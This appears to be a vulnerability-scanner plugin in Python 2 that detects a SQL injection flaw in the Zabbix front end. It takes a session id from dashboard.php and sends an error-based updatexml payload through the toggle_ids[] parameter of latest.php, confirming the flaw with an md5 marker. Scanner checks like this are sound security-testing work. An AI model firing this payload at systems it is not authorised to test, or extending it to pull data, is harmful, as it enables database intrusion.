# coding:utf-8
import re
import urllib2
from config import is_port_open, is_http


@is_port_open
def verify(ip, port=80, name='', timeout=10):
    if is_http(ip, int(port)) is False:
        return
    try:
        url = "http://" + ip + ":" + str(port)
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor())
        request = opener.open(url + "/dashboard.php", timeout=timeout)
        res_html = request.read()
    except:
        return
    if 'href="slides.php?sid=' in res_html:
        m = re.search(r'href="slides\.php\?sid=(.+?)">', res_html, re.M | re.I)
        if m:
            sid = m.group(1)
            payload = "/latest.php?output=ajax&sid={sid}&favobj=toggle&toggle_open_state=1&toggle_ids[]=(select%20updatexml(1,concat(0x7e,(SELECT%20md5(666)),0x7e),1))".format(
                sid=sid)
            res_html = opener.open(url + payload, timeout=timeout).read()
            if 'fae0b27c451c728867a567e8c1bb4e5' in res_html:
                info = {
                    "url": url,
                    "vuln_name": 'zabbix sql injection',
                    'severity': 'high',
                    'proof': payload
                }
                return info
